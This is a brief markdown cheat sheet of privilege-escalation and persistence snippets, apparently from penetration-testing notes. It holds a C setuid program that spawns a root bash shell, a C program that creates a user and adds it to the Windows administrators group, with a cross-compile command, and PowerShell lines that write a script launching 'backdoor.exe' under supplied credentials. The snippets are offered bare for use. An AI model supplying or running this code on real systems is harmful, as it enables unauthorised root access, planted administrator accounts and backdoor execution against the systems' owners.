# Useful Code

### Setuid.c (Linux - Set Owner User ID)

```c
int main(){
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

### Useradd.c (Windows - Add user)

```c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
```

### Powershell Run As (run file as another user)

```powershell
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```
